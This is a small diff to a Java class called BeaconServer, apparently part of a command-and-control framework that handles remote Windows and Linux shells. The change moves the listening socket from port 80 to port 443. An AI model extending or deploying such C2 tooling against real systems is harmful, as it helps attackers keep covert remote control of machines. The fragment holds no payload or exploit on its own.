@@ -71,7 +71,7 @@ public class BeaconServer implements Runnable{
         this.windowsShellLocks = new HashMap<>();
         this.linuxShellLocks = new HashMap<>();
         this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
-        this.serverSocket = new ServerSocket(80);
+        this.serverSocket = new ServerSocket(443);
         this.settingUp = false;
         synchronized(settingUpLock){
             settingUpLock.notify();
